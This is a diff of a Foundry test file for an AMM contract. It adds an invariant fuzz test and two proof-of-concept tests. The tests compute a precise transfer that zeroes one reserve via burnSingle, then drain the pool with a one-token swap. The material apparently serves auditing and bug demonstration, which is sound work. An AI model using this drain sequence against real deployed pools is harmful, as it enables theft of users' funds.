@@ -47,22 +47,48 @@ contract CPPMiniTest is Test {
         targetSender(Bob);
     }
 
-    function test_manual() public  {
+/***    @title fuzz test the invariant 
+        Check for the invariant that reserve0 is 0 iff reserve1 is 0 and iff totalSupply is 0.
+
+        This did not find the bug even after 100k runs. 
+ */
+    function invariant_integrityOfTotalSupply() public  view {
+        uint256 reserve0 = cpp.getReserve0();
+        uint256 reserve1 = cpp.getReserve1();
+        uint256 totalSupply = cpp.totalSupply();
+        assertEq(reserve0 == 0 , totalSupply == 0);
+        assertEq(reserve1 == 0 , totalSupply == 0);
+    }
+
+
+/***    @title Manual show the violation  
+        Only a specific computed value can cause the violation 
+
+        run command: forge test --match-test test_manual_bug -vvv
+ */
+
+    function test_manual_bug() public  {
         vm.startPrank(Alice);
         cpp.transferAndMint(20,200);
         uint256 liquidity = cpp.balanceOf(Alice);
         uint256 _reserve0 = cpp.getReserve0();
         uint256 _totalSupply = cpp.totalSupply();
-        uint256 _actualB0 = token0.balanceOf(address(cpp));
-        uint256 _actualB1 = token1.balanceOf(address(cpp));
+        
         /*
-         we need _reserve0 == amount0
+         we need _reserve0 == amount0 at the call to:
+
+            amount1 += _getAmountOut(
+                amount0,
+                _reserve0 - amount0,
+                _reserve1 - amount1
+            );  
+
+
          amount0 === (liquidity * balance0 ) / _totalSupply
          _reserve0 === (liquidity * balance0 ) / _totalSupply 
-
-        simple math we can compute it backwards 
+        simple math we can compute the required balance0:
+        
          */
-
 
         uint256 balanceForBug = _reserve0 * _totalSupply /liquidity + 1;
         uint256 amountToTransfer = balanceForBug - _reserve0 ;
@@ -71,19 +97,29 @@ contract CPPMiniTest is Test {
         cpp.burnSingle(true, liquidity);
 
         // now that we have one reserve 0 the invariant fails
-        // invariant_reserve(); // comment this out to see how critical is this bug
-        // but we can just continue to drain the protocol
-        cpp.transferAndSwap(false, 1);
-        _actualB0 = token0.balanceOf(address(cpp));
-        _actualB1 = token0.balanceOf(address(cpp));
-        console.log(_actualB0, _actualB1);
+        invariant_integrityOfTotalSupply();
     }
 
-    function invariant_reserve() public  view {
-        uint256 reserve0 = cpp.getReserve0();
-        uint256 reserve1 = cpp.getReserve1();
-        uint256 totalSupply = cpp.totalSupply();
-        assertEq(reserve0 == 0 , totalSupply == 0);
-        assertEq(reserve1 == 0 , totalSupply == 0);
+/***
+    @title Critical bug demonstration
+    Once the invariant is broken, one can swap the entire reserve for just one token 
+    run command: forge test --match-test test_manual_continue_to_drain -vvv
+ */
+    function test_manual_continue_to_drain() public  {
+        vm.startPrank(Alice);
+        cpp.transferAndMint(20,200);
+        uint256 liquidity = cpp.balanceOf(Alice);
+        uint256 _reserve0 = cpp.getReserve0();
+        uint256 _totalSupply = cpp.totalSupply();
+        uint256 balanceForBug = _reserve0 * _totalSupply /liquidity + 1;
+        uint256 amountToTransfer = balanceForBug - _reserve0 ;
+    
+        cpp.externalTransfer(amountToTransfer, 0);
+        cpp.burnSingle(true, liquidity);
+
+        // lets continue to drain the protocol
+        cpp.transferAndSwap(false, 1);
+        console.log(token0.balanceOf(address(cpp)), token1.balanceOf(address(cpp)), cpp.totalSupply());
     }
+    
 }
